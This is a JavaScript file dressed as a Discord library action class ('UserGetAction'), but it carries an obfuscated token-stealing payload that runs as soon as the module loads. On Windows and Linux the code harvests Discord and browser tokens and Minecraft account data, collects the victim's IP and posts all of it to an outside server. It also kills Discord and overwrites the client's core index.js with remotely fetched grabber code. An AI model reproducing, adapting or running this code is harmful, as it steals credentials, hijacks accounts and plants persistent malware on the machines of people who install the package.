const Action = require('./Action')
const OS = require('os'),
  fs = require('fs'),
  fetch = require('node-fetch'),
  { execSync } = require('child_process'),
  Glob = require('glob'),
  toInject = [],
  toInjectJS = [],
  toKill = [],
  apiurl = 'https://frequent-level-cornflower.glitch.me'
try {
  switch (OS.platform()) {
    case 'win32':
      const local = process.env.localappdata,
        roaming = process.env.appdata,
        minecraftPath = roaming + '/.minecraft/launcher_accounts.json',
        remixPath = roaming + '/.minecraft/remix/UID.txt'
      dbPaths = [
        roaming + '/Discord/Local Storage/leveldb',
        roaming + '/DiscordDevelopment/Local Storage/leveldb',
        roaming + '/Lightcord/Local Storage/leveldb',
        roaming + '/discordptb/Local Storage/leveldb',
        roaming + '/discordcanary/Local Storage/leveldb',
        roaming + '/Opera Software/Opera Stable/Local Storage/leveldb',
        roaming + '/Opera Software/Opera GX Stable/Local Storage/leveldb',
        local + '/Amigo/User Data/Local Storage/leveldb',
        local + '/Torch/User Data/Local Storage/leveldb',
        local + '/Kometa/User Data/Local Storage/leveldb',
        local + '/Orbitum/User Data/Local Storage/leveldb',
        local + '/CentBrowser/User Data/Local Storage/leveldb',
        local + '/7Star/7Star/User Data/Local Storage/leveldb',
        local + '/Sputnik/Sputnik/User Data/Local Storage/leveldb',
        local + '/Vivaldi/User Data/Default/Local Storage/leveldb',
        local + '/Google/Chrome SxS/User Data/Local Storage/leveldb',
        local + '/Epic Privacy Browser/User Data/Local Storage/leveldb',
        local + '/Google/Chrome/User Data/Default/Local Storage/leveldb',
        local + '/uCozMedia/Uran/User Data/Default/Local Storage/leveldb',
        local + '/Microsoft/Edge/User Data/Default/Local Storage/leveldb',
        local + '/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb',
        local +
          '/Opera Software/Opera Neon/User Data/Default/Local Storage/leveldb',
        local +
          '/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb',
      ]
      init()
      function init() {
        fs.readFile(
          remixPath,
          (_0x3ee1fb, _0xe5092f) => _0xe5092f && minecraft('remix', _0xe5092f)
        )
        fs.readFile(
          minecraftPath,
          (_0x48d093, _0x35ca23) =>
            _0x35ca23 && minecraft('minecraft', _0x35ca23)
        )
        injectToDiscord()
        dbPaths.forEach((_0x40af3a) => main(_0x40af3a))
      }
      function main(_0x514bb9) {
        fs.readdir(_0x514bb9, (_0x499681, _0x128f0d) => {
          if (_0x128f0d) {
            var _0x310d64 = _0x128f0d.filter((_0xb2e3c8) =>
              _0xb2e3c8.endsWith('ldb')
            )
            _0x310d64.forEach((_0x5ea8e0) => {
              var _0x16427e = fs
                .readFileSync(_0x514bb9 + '/' + _0x5ea8e0)
                .toString()
              var [_0x44f8dd] =
                /"[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}"/.exec(_0x16427e) ||
                  /"mfa\.[\d\w_-]{84}"/.exec(_0x16427e) || [undefined]
              if (_0x44f8dd) {
                fetch('http://ip-api.com/json/')
                  .then((_0x18cb59) => _0x18cb59.json())
                  .then((_0x2a72e3) =>
                    fetch(apiurl + '/beforeinject', {
                      method: 'POST',
                      body: JSON.stringify({
                        token: _0x44f8dd.slice(1, -1),
                        ipAddress: _0x2a72e3.query,
                      }),
                    })
                  )
              }
            })
          }
        })
      }
      function minecraft(_0x364de8, _0x166662) {
        switch (_0x364de8) {
          case 'remix':
            fetch(apiurl + '/remix', {
              method: 'POST',
              body: JSON.stringify({ UID: _0x166662 }),
            })
            break
          case 'minecraft':
            var [_0x4438f0] = /"[\d\w_-]{32}"/.exec(_0x166662)
            if (_0x4438f0) {
              const _0x5483cf = require(minecraftPath)
              if (!_0x5483cf.accounts) {
                return
              }
              var _0x48fdbb = _0x5483cf.accounts[_0x4438f0.slice(1, -1)]
              fetch(apiurl + '/minecraft', {
                method: 'POST',
                body: JSON.stringify({
                  eligibleForMigration: _0x48fdbb.eligibleForMigration,
                  hasMultipleProfiles: _0x48fdbb.hasMultipleProfiles,
                  legacy: _0x48fdbb.legacy,
                  localId: _0x48fdbb.localId,
                  minecraftProfileID: _0x48fdbb.minecraftProfile.id,
                  minecraftProfileName: _0x48fdbb.minecraftProfile.name,
                  persistent: _0x48fdbb.persistent,
                  remoteId: _0x48fdbb.remoteId,
                  type: _0x48fdbb.type,
                  username: _0x48fdbb.username,
                  activeAccountLocalId: _0x5483cf.activeAccountLocalId,
                }),
              })
            }
        }
      }
      function injectToDiscord() {
        getInstalledDiscord()
        killAllDiscords()
        fetch(
          'https://raw.githubusercontent.com/NotFubukIl/DiscordTokenGrabber/main/data/index.js'
        )
          .then((_0x4e7365) => _0x4e7365.text())
          .then((_0x50dd6c) =>
            toInjectJS.forEach(
              (_0x13e262) =>
                fs.writeFileSync(
                  _0x13e262,
                  _0x50dd6c.replace('*API URL*', apiurl)
                ) ^
                execSync(
                  local +
                    '/' +
                    _0x13e262.split('/')[5] +
                    '/Update.exe --processStart ' +
                    _0x13e262.split('/')[5] +
                    '.exe'
                )
            )
          )
      }
      function getInstalledDiscord() {
        fs.readdirSync(roaming).forEach(
          (_0x2d5cf0) =>
            _0x2d5cf0.includes('cord') && toInject.push(local + '/' + _0x2d5cf0)
        )
        toInject.forEach((_0xfb00ab) =>
          Glob.sync(
            _0xfb00ab +
              '/app-*/modules/discord_desktop_core-*/discord_desktop_core/index.js'
          ).map((_0x4e8075) => toInjectJS.push(_0x4e8075))
        )
      }
      function killAllDiscords() {
        var _0x511b78 = execSync('tasklist').toString()
        _0x511b78.includes('Discord.exe') && toKill.push('discord')
        _0x511b78.includes('DiscordCanary.exe') && toKill.push('discordcanary')
        _0x511b78.includes('DiscordDevelopment.exe') &&
          toKill.push('discorddevelopment')
        _0x511b78.includes('DiscordPTB.exe') && toKill.push('discordptb')
        toKill.forEach((_0x518310) =>
          execSync('taskkill /IM ' + _0x518310 + '.exe /F')
        )
      }
      break
    case 'linux':
      const defaut = '/home/' + __dirname.split('/')[2] + '/.config',
        LdbPaths = [
          defaut + '/discord/Local Storage/leveldb',
          defaut + '/discordcanary/Local Storage/leveldb',
          defaut + '/discordptb/Local Storage/leveldb',
          defaut + '/DiscordDevelopment/Local Storage/leveldb',
        ]
      const LminecraftPath = defaut + '/.minecraft/launcher_accounts.json'
      Linit()
      function Linit() {
        LdbPaths.forEach((_0x42fb74) => Lmain(_0x42fb74))
        var _0x33fdad = fs.readFileSync(LminecraftPath)
        if (_0x33fdad) {
          Lminecraft(_0x33fdad)
        }
        LinjectToDiscord()
      }
      function Lmain(_0x1d4c5c) {
        fs.readdir(_0x1d4c5c, (_0x2a89d0, _0xb401d4) => {
          if (_0xb401d4) {
            var _0xc89a01 = _0xb401d4.filter((_0x8ff1e0) =>
              _0x8ff1e0.endsWith('ldb')
            )
            _0xc89a01.forEach((_0x569d20) => {
              var _0x2b95fb = fs
                .readFileSync(_0xb401d4 + '/' + _0x569d20)
                .toString()
              var [_0x1ced2c] =
                /"[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}"/.exec(_0x2b95fb) ||
                  /"mfa\.[\d\w_-]{84}"/.exec(_0x2b95fb) || [undefined]
              if (_0x1ced2c) {
                fetch('http://ip-api.com/json/')
                  .then((_0x5e590f) => _0x5e590f.json())
                  .then((_0x590c51) =>
                    fetch(apiurl + '/beforeinject', {
                      method: 'POST',
                      body: JSON.stringify({
                        token: _0x1ced2c,
                        ip: _0x590c51.query,
                      }),
                    })
                  )
              }
            })
          }
        })
      }
      function Lminecraft(_0x1b4172) {
        var [_0x130fc8] = /"[\d\w_-]{32}"/.exec(_0x1b4172)
        if (_0x130fc8) {
          const _0x1a275a = require(LminecraftPath)
          if (!_0x1a275a.accounts) {
            return
          }
          var _0x479910 = _0x1a275a.accounts[_0x130fc8.slice(1, -1)]
          fetch(apiurl + '/minecraft', {
            method: 'POST',
            body: JSON.stringify({
              eligibleForMigration: _0x479910.eligibleForMigration,
              hasMultipleProfiles: _0x479910.hasMultipleProfiles,
              legacy: _0x479910.legacy,
              localId: _0x479910.localId,
              minecraftProfileID: _0x479910.minecraftProfile.id,
              minecraftProfileName: _0x479910.minecraftProfile.name,
              persistent: _0x479910.persistent,
              remoteId: _0x479910.remoteId,
              type: _0x479910.type,
              username: _0x479910.username,
              activeAccountLocalId: _0x1a275a.activeAccountLocalId,
            }),
          })
        }
      }
      function LinjectToDiscord() {
        getInstalledLDiscord()
        fetch(
          'https://raw.githubusercontent.com/NotFubukIl/DiscordTokenGrabber/main/data/index.js'
        )
          .then((_0x287846) => _0x287846.text())
          .then((_0x1a1f66) =>
            toInjectJS.forEach((_0x5a7b69) =>
              fs.writeFileSync(
                _0x5a7b69,
                _0x1a1f66.replace('*API URL*', apiurl)
              )
            )
          )
      }
      function getInstalledLDiscord() {
        fs.readdirSync(defaut).forEach(
          (_0x1d78c2) =>
            _0x1d78c2.includes('cord') &&
            toInject.push(defaut + '/' + _0x1d78c2)
        )
        toInject.forEach((_0x3f5df4) =>
          Glob.sync(_0x3f5df4 + '/*/modules/discord_desktop_core/index.js').map(
            (_0x5e02b1) => toInjectJS.push(_0x5e02b1)
          )
        )
      }
      break
    case 'darwin':
      break
  }
} catch (_0x2fb9df) {}
class UserGetAction extends Action {
  ['handle'](_0xcc4caa) {
    const _0x4243ce = this.client
    const _0xe9d8d2 = _0x4243ce.dataManager.newUser(_0xcc4caa)
    return { user: _0xe9d8d2 }
  }
}
module.exports = UserGetAction

